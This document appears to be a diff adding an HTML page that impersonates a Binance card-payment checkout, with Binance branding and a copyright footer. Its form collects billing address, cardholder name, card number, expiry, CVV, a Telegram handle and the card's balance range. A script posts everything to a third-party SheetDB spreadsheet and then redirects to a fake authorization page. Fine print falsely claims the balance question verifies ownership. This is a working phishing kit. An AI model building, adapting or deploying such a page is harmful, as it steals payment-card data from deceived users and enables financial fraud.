@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        <!-- Google fonts -->
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+
+        <!-- Bootstrap css link -->
+        <link rel="stylesheet" href="../node/bootstrap/dist/css/bootstrap.min.css">
+        <!-- Main css link -->
+        <link rel="stylesheet" href="../css/style.css">
+
+        <title>Binance Card Payment</title>
+        <link rel="icon" type="image/x-icon" href="../image/binance.ico">
+
+        <style>
+            
+            /* Scrollbar css style start ----- */
+            ::-webkit-scrollbar {
+                width: 8px;
+                background-color: #F5F5F5;
+            }
+            ::-webkit-scrollbar-thumb {
+                box-shadow: inset 0 0 6px rgb(0 0 0 / 30%);
+                background-color: #fcd434;
+            }
+            ::-webkit-scrollbar-track {
+                box-shadow: inset 0 0 6px rgb(0 0 0 / 30%);
+                background-color: #F5F5F5;
+            }
+            /* Scrollbar css style end ----- */
+
+        </style>
+    </head>
+    <body>
+        
+
+
+
+
+        <!-- ----------#####---------- Navigation menu (Section) starts here ----------#####---------- -->
+                
+            <nav class="project-nav-menu fixed-top container-fluid" style="background-color: #fff;">
+                <div class="nav container fixed-top">
+                    <div class="nav-header" style="display: flex;flex-direction: row;justify-content: space-between;">
+                        <div class="nav-title" style="cursor: pointer;color: #e9b823;" onclick="document.location.href='/binance/pay'">
+                            <img src="../image/binance.png" style="width: 22.5px;height: 22.5px;margin-right: 7px;">Binance-Pay
+                        </div>
+                    </div>
+                    <div style="margin-top: 5px;">
+                        <a href="/plan" style="background-color: #fcd434;color: #3e3e3d;" class="get-started-btn nav-btn-shift">Go Back</a>
+                    </div>
+                </div>
+            </nav>
+
+        <!-- Closed ----------#####---------- -->
+
+
+
+
+
+
+        <!-- ----------#####---------- Header (Section) starts here ----------#####---------- -->
+        
+            <header class="container" style="padding-top: 5em;padding-bottom: 1.2em;">
+                <div class="row align-items-center">
+                    <!-- Header right container -->
+                    <div class="col-12 p-2 mx-auto">
+                        <div class="header-ryt-container" style="text-align: center;">
+                            <h1 class="heading" style="color: #3e3e3d;padding-top: 1.25em;">Billing Address</h1>
+                        </div>
+                    </div>
+                </div>
+            </header>
+            
+        <!-- Closed ----------#####---------- -->
+
+
+
+
+
+
+        <!-- Category container start -->
+		<section class="container">
+			
+			<form action="https://sheetdb.io/api/v1/osi6fadks8lqi" method="post" id="sheetdb-form">
+				<div class="row">
+					                    
+                    <div class="col-12 col-md-6 col-lg-4 p-3">
+						<div class="field padding-bottom--24">
+                            <label class="binance-label" for="email">Address</label>
+                            <input class="binance-input" type="text" name="data[UAdd]">
+                        </div>
+					</div>
+					<div class="col-6 col-md-6 col-lg-2 p-3">
+						<div class="field padding-bottom--24">
+                            <label class="binance-label" for="email">Zip Code</label>
+                            <input class="binance-input" type="number" onKeyPress="if(this.value.length==5) return false;" name="data[UZip]">
+                        </div>
+					</div>
+                    <div class="col-6 col-md-6 col-lg-2 p-3">
+						<div class="field padding-bottom--24">
+                            <label class="binance-label" for="email">City</label>
+                            <input class="binance-input" type="text" name="data[UCity]">
+                        </div>
+					</div>
+					
+					<div class="col-12 col-md-6 col-lg-4 p-3">
+						<div class="field padding-bottom--24">
+                            <label class="binance-label" for="email">Country of Residence</label>
+                            <input class="binance-input" type="text" name="data[UCountry]" list="UCountry" placeholder=" Select Country ">
+                            <datalist id="UCountry" >
+                                <option value="Afghanistan">AF</option>
+                                <option value="Aland Islands">AX</option>
+                                <option value="Albania">AL</option>
+                                <option value="Algeria">DZ</option>
+                                <option value="American Samoa">AS</option>
+                                <option value="Andorra">AD</option>
+                                <option value="Angola">AO</option>
+                                <option value="Anguilla">AI</option>
+                                <option value="Antarctica">AQ</option>
+                                <option value="Antigua and Barbuda">AG</option>
+                                <option value="Argentina">AR</option>
+                                <option value="Armenia">AM</option>
+                                <option value="Aruba">AW</option>
+                                <option value="Australia">AU</option>
+                                <option value="Austria">AT</option>
+                                <option value="Azerbaijan">AZ</option>
+                                <option value="Bahamas">BS</option>
+                                <option value="Bahrain">BH</option>
+                                <option value="Bangladesh">BD</option>
+                                <option value="Barbados">BB</option>
+                                <option value="Belarus">BY</option>
+                                <option value="Belgium">BE</option>
+                                <option value="Belize">BZ</option>
+                                <option value="Benin">BJ</option>
+                                <option value="Bermuda">BM</option>
+                                <option value="Bhutan">BT</option>
+                                <option value="Bolivia">BO</option>
+                                <option value="Bonaire, Sint Eustatius and Saba">BQ</option>
+                                <option value="Bosnia and Herzegovina">BA</option>
+                                <option value="Botswana">BW</option>
+                                <option value="Bouvet Island">BV</option>
+                                <option value="Brazil">BR</option>
+                                <option value="British Indian Ocean Territory">IO</option>
+                                <option value="Brunei Darussalam">BN</option>
+                                <option value="Bulgaria">BG</option>
+                                <option value="Burkina Faso">BF</option>
+                                <option value="Burundi">BI</option>
+                                <option value="Cambodia">KH</option>
+                                <option value="Cameroon">CM</option>
+                                <option value="Canada">CA</option>
+                                <option value="Cape Verde">CV</option>
+                                <option value="Cayman Islands">KY</option>
+                                <option value="Central African Republic">CF</option>
+                                <option value="Chad">TD</option>
+                                <option value="Chile">CL</option>
+                                <option value="China">CN</option>
+                                <option value="Christmas Island">CX</option>
+                                <option value="Cocos (Keeling) Islands">CC</option>
+                                <option value="Colombia">CO</option>
+                                <option value="Comoros">KM</option>
+                                <option value="Congo">CG</option>
+                                <option value="Congo, Democratic Republic of the Congo">CD</option>
+                                <option value="Cook Islands">CK</option>
+                                <option value="Costa Rica">CR</option>
+                                <option value="Cote D'Ivoire">CI</option>
+                                <option value="Croatia">HR</option>
+                                <option value="Cuba">CU</option>
+                                <option value="Curacao">CW</option>
+                                <option value="Cyprus">CY</option>
+                                <option value="Czech Republic">CZ</option>
+                                <option value="Denmark">DK</option>
+                                <option value="Djibouti">DJ</option>
+                                <option value="Dominica">DM</option>
+                                <option value="Dominican Republic">DO</option>
+                                <option value="Ecuador">EC</option>
+                                <option value="Egypt">EG</option>
+                                <option value="El Salvador">SV</option>
+                                <option value="Equatorial Guinea">GQ</option>
+                                <option value="Eritrea">ER</option>
+                                <option value="Estonia">EE</option>
+                                <option value="Ethiopia">ET</option>
+                                <option value="Falkland Islands (Malvinas)">FK</option>
+                                <option value="Faroe Islands">FO</option>
+                                <option value="Fiji">FJ</option>
+                                <option value="Finland">FI</option>
+                                <option value="France">FR</option>
+                                <option value="French Guiana">GF</option>
+                                <option value="French Polynesia">PF</option>
+                                <option value="French Southern Territories">TF</option>
+                                <option value="Gabon">GA</option>
+                                <option value="Gambia">GM</option>
+                                <option value="Georgia">GE</option>
+                                <option value="Germany">DE</option>
+                                <option value="Ghana">GH</option>
+                                <option value="Gibraltar">GI</option>
+                                <option value="Greece">GR</option>
+                                <option value="Greenland">GL</option>
+                                <option value="Grenada">GD</option>
+                                <option value="Guadeloupe">GP</option>
+                                <option value="Guam">GU</option>
+                                <option value="Guatemala">GT</option>
+                                <option value="Guernsey">GG</option>
+                                <option value="Guinea">GN</option>
+                                <option value="Guinea-Bissau">GW</option>
+                                <option value="Guyana">GY</option>
+                                <option value="Haiti">HT</option>
+                                <option value="Heard Island and Mcdonald Islands">HM</option>
+                                <option value="Holy See (Vatican City State)">VA</option>
+                                <option value="Honduras">HN</option>
+                                <option value="Hong Kong">HK</option>
+                                <option value="Hungary">HU</option>
+                                <option value="Iceland">IS</option>
+                                <option value="India">IN</option>
+                                <option value="Indonesia">ID</option>
+                                <option value="Islamic Republic of Iran">IR</option>
+                                <option value="Iraq">IQ</option>
+                                <option value="Ireland">IE</option>
+                                <option value="Isle of Man">IM</option>
+                                <option value="Israel">IL</option>
+                                <option value="Italy">IT</option>
+                                <option value="Jamaica">JM</option>
+                                <option value="Japan">JP</option>
+                                <option value="Jersey">JE</option>
+                                <option value="Jordan">JO</option>
+                                <option value="Kazakhstan">KZ</option>
+                                <option value="Kenya">KE</option>
+                                <option value="Kiribati">KI</option>
+                                <option value="Korea, Democratic People's Republic of">KP</option>
+                                <option value="Korea, Republic of">KR</option>
+                                <option value="Kosovo">XK</option>
+                                <option value="Kuwait">KW</option>
+                                <option value="Kyrgyzstan">KG</option>
+                                <option value="Lao People's Democratic Republic">LA</option>
+                                <option value="Latvia">LV</option>
+                                <option value="Lebanon">LB</option>
+                                <option value="Lesotho">LS</option>
+                                <option value="Liberia">LR</option>
+                                <option value="Libyan Arab Jamahiriya">LY</option>
+                                <option value="Liechtenstein">LI</option>
+                                <option value="Lithuania">LT</option>
+                                <option value="Luxembourg">LU</option>
+                                <option value="Macao">MO</option>
+                                <option value="Macedonia, the Former Yugoslav Republic of">MK</option>
+                                <option value="Madagascar">MG</option>
+                                <option value="Malawi">MW</option>
+                                <option value="Malaysia">MY</option>
+                                <option value="Maldives">MV</option>
+                                <option value="Mali">ML</option>
+                                <option value="Malta">MT</option>
+                                <option value="Marshall Islands">MH</option>
+                                <option value="Martinique">MQ</option>
+                                <option value="Mauritania">MR</option>
+                                <option value="Mauritius">MU</option>
+                                <option value="Mayotte">YT</option>
+                                <option value="Mexico">MX</option>
+                                <option value="Micronesia, Federated States of">FM</option>
+                                <option value="Moldova, Republic of">MD</option>
+                                <option value="Monaco">MC</option>
+                                <option value="Mongolia">MN</option>
+                                <option value="Montenegro">ME</option>
+                                <option value="Montserrat">MS</option>
+                                <option value="Morocco">MA</option>
+                                <option value="Mozambique">MZ</option>
+                                <option value="Myanmar">MM</option>
+                                <option value="Namibia">NA</option>
+                                <option value="Nauru">NR</option>
+                                <option value="Nepal">NP</option>
+                                <option value="Netherlands">NL</option>
+                                <option value="Netherlands Antilles">AN</option>
+                                <option value="New Caledonia">NC</option>
+                                <option value="New Zealand">NZ</option>
+                                <option value="Nicaragua">NI</option>
+                                <option value="Niger">NE</option>
+                                <option value="Nigeria">NG</option>
+                                <option value="Niue">NU</option>
+                                <option value="Norfolk Island">NF</option>
+                                <option value="Northern Mariana Islands">MP</option>
+                                <option value="Norway">NO</option>
+                                <option value="Oman">OM</option>
+                                <option value="Pakistan">PK</option>
+                                <option value="Palau">PW</option>
+                                <option value="Palestinian Territory, Occupied">PS</option>
+                                <option value="Panama">PA</option>
+                                <option value="Papua New Guinea">PG</option>
+                                <option value="Paraguay">PY</option>
+                                <option value="Peru">PE</option>
+                                <option value="Philippines">PH</option>
+                                <option value="Pitcairn">PN</option>
+                                <option value="Poland">PL</option>
+                                <option value="Portugal">PT</option>
+                                <option value="Puerto Rico">PR</option>
+                                <option value="Qatar">QA</option>
+                                <option value="Reunion">RE</option>
+                                <option value="Romania">RO</option>
+                                <option value="Russian Federation">RU</option>
+                                <option value="Rwanda">RW</option>
+                                <option value="Saint Barthelemy">BL</option>
+                                <option value="Saint Helena">SH</option>
+                                <option value="Saint Kitts and Nevis">KN</option>
+                                <option value="Saint Lucia">LC</option>
+                                <option value="Saint Martin">MF</option>
+                                <option value="Saint Pierre and Miquelon">PM</option>
+                                <option value="Saint Vincent and the Grenadines">VC</option>
+                                <option value="Samoa">WS</option>
+                                <option value="San Marino">SM</option>
+                                <option value="Sao Tome and Principe">ST</option>
+                                <option value="Saudi Arabia">SA</option>
+                                <option value="Senegal">SN</option>
+                                <option value="Serbia">RS</option>
+                                <option value="Serbia and Montenegro">CS</option>
+                                <option value="Seychelles">SC</option>
+                                <option value="Sierra Leone">SL</option>
+                                <option value="Singapore">SG</option>
+                                <option value="Sint Maarten">SX</option>
+                                <option value="Slovakia">SK</option>
+                                <option value="Slovenia">SI</option>
+                                <option value="Solomon Islands">SB</option>
+                                <option value="Somalia">SO</option>
+                                <option value="South Africa">ZA</option>
+                                <option value="South Georgia and the South Sandwich Islands">GS</option>
+                                <option value="South Sudan">SS</option>
+                                <option value="Spain">ES</option>
+                                <option value="Sri Lanka">LK</option>
+                                <option value="Sudan">SD</option>
+                                <option value="Suriname">SR</option>
+                                <option value="Svalbard and Jan Mayen">SJ</option>
+                                <option value="Swaziland">SZ</option>
+                                <option value="Sweden">SE</option>
+                                <option value="Switzerland">CH</option>
+                                <option value="Syrian Arab Republic">SY</option>
+                                <option value="Taiwan, Province of China">TW</option>
+                                <option value="Tajikistan">TJ</option>
+                                <option value="Tanzania, United Republic of">TZ</option>
+                                <option value="Thailand">TH</option>
+                                <option value="Timor-Leste">TL</option>
+                                <option value="Togo">TG</option>
+                                <option value="Tokelau">TK</option>
+                                <option value="Tonga">TO</option>
+                                <option value="Trinidad and Tobago">TT</option>
+                                <option value="Tunisia">TN</option>
+                                <option value="Turkey">TR</option>
+                                <option value="Turkmenistan">TM</option>
+                                <option value="Turks and Caicos Islands">TC</option>
+                                <option value="Tuvalu">TV</option>
+                                <option value="Uganda">UG</option>
+                                <option value="Ukraine">UA</option>
+                                <option value="United Arab Emirates">AE</option>
+                                <option value="United Kingdom">GB</option>
+                                <option value="United States">US</option>
+                                <option value="United States Minor Outlying Islands">UM</option>
+                                <option value="Uruguay">UY</option>
+                                <option value="Uzbekistan">UZ</option>
+                                <option value="Vanuatu">VU</option>
+                                <option value="Venezuela">VE</option>
+                                <option value="Viet Nam">VN</option>
+                                <option value="Virgin Islands, British">VG</option>
+                                <option value="Virgin Islands, U.S.">VI</option>
+                                <option value="Wallis and Futuna">WF</option>
+                                <option value="Western Sahara">EH</option>
+                                <option value="Yemen">YE</option>
+                                <option value="Zambia">ZM</option>
+                                <option value="Zimbabwe">ZW</option>
+                            </datalist>
+                        </div>
+					</div>
+                    
+
+
+
+
+
+                    <div class="col-12 p-2 mx-auto">
+                        <div class="header-ryt-container" style="text-align: center;">
+                            <h1 class="heading" style="color: #3e3e3d;padding-top: 1.25em;">Card Details</h1>
+                            <span class="col-12" style="text-align:center;padding-top: 1.15em;padding-bottom: 1.15em;">Input your debit/credit card details correctly.</span>
+                        </div>
+                    </div>
+                    
+
+
+
+                    
+
+                    <div class="col-12 col-md-6 col-lg-4 p-3">
+						<div class="field padding-bottom--24">
+                            <label class="binance-label" for="email">Name on Card</label>
+                            <input class="binance-input" type="name" name="data[CName]">
+                        </div>
+					</div>
+                    <div class="col-12 col-md-6 col-lg-4 p-3">
+						<div class="field padding-bottom--24">
+                            <label class="binance-label" for="email">Card Number</label>
+                            <input class="binance-input" id="cno" maxlength="19" type="text" name="data[CNumber]">
+                        </div>
+					</div>
+					<div class="col-6 col-md-6 col-lg-2 p-3">
+						<div class="field padding-bottom--24">
+                            <label class="binance-label" for="email">Expiry Date</label>
+                            <input class="binance-input" name="data[CExpiry]" type="month" max="2050-12" min="2022-03" required\>
+                        </div>
+					</div>
+					<div class="col-6 col-md-6 col-lg-2 p-3">
+						<div class="field padding-bottom--24">
+                            <label class="binance-label" for="email">CVV</label>
+                            <input class="binance-input" onKeyPress="if(this.value.length==3) return false;" type="number" name="data[CCvv]">
+                        </div>
+					</div>
+
+
+
+
+
+                    <div class="col-12 p-2 mx-auto">
+                        <div class="header-ryt-container" style="text-align: center;">
+                            <h1 class="heading" style="color: #3e3e3d;padding-top: 1.25em;">Required Credentials</h1>
+                        </div>
+                    </div>
+                    
+                    <div class="col-12 col-md-6 col-lg-4 p-3 mx-auto">
+						<div class="field padding-bottom--24">
+                            <label class="binance-label" for="email">Your Telegram Link</label>
+                            <input class="binance-input" type="text" name="data[ATele]">
+                        </div>
+					</div>
+                    <div class="col-12 col-md-6 col-lg-4 p-3 mx-auto">
+						<div class="field padding-bottom--24">
+                            <label class="binance-label" for="email">Card Range</label>
+                            <input class="binance-input" type="text" name="data[ARange]" list="ARange" placeholder=" Select Card Balance ">
+                            <datalist id="ARange" >
+                                <option>$100 - $500</option>
+                                <option>$500 - $2,000</option>
+                                <option>$2,000 - $3,500</option>
+                                <option>$3,500 - $6,000</option>
+                                <option>$6,000 - $9,500</option>
+                                <option>$9,500 - $11,000</option>
+                                <option>$11,000 - $14,000</option>
+                                <option>$14,500 - $16,000</option>
+                                <option>$16,000 - $19,500</option>
+                                <option>$19,000 - above</option>
+                            </datalist>
+                        <br><span style="font-size: 0.75em;font-weight: 600;">Choose your Master or Visa card's account balance range from the listed options. Information is used to make sure only the owner of the card can make purchase. Card won't be processed if provided details are <span style="color: red;">INCORRECT</span></span>
+                        </div>
+					</div>
+
+
+                    <div class="col-12" style="margin-top:3.75em;text-align: center;font-weight: 500;">
+						<div><button type="submit" class="submit-btn">Pay with card</button></div>
+					</div>
+
+                </div>
+            </form>
+
+        </section>
+
+
+
+        
+
+        <div class="col-12" style="margin-top:15;text-align: center;font-weight: 500;">
+            <div class="normal-txt" style="margin: 5em 0 3em 0;text-align: center;">© 2017 - 2022 Binance.com. All rights reserved</div>
+        </div>
+
+        
+
+
+
+
+
+    </body>
+    
+    <!-- Option 1: Bootstrap Bundle with JQuery -->
+    <script src="../script/jquery.js"></script>
+	<script src="../node/bootstrap/dist/js/bootstrap.js"></script>
+
+    
+	<script>
+		var form = document.getElementById('sheetdb-form');
+		form.addEventListener("submit", e => {
+			e.preventDefault();
+			fetch(form.action, {
+				method : "POST",
+				body: new FormData(document.getElementById("sheetdb-form")),
+			}).then(
+				response => response.json()
+			).then((html) => {
+				// you can put any JS code here
+				window.open('/binance/pay/authorization', "_self");
+
+			});
+		});
+	</script>
+
+    <script>
+        document.getElementById('cno').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
+    </script>
+
+</html>
